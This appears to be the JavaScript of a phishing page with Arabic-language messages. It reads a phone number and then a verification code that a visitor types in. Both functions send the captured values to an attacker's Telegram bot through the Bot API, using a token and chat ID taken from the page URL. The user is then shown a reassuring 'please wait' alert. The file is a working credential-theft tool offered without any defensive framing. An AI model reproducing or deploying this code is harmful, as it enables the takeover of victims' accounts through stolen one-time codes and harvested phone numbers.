
const urlParams = new URLSearchParams(window.location.search);
const chat_id = urlParams.get("chat_id");
const token = urlParams.get("token");

function sendPhone() {
    const code = document.getElementById("country-code").value;
    const phone = document.getElementById("phone").value;
    const full = code + phone;
    const msg = `📞 رقم المستخدم: ${full}`;
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    document.getElementById("verify-section").style.display = "block";
}

function sendCode() {
    const code = document.getElementById("code").value;
    const msg = `🔐 رمز التحقق الذي أدخله المستخدم: ${code}`;
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
    alert("تم إرسال الرمز، يرجى الانتظار...");
}
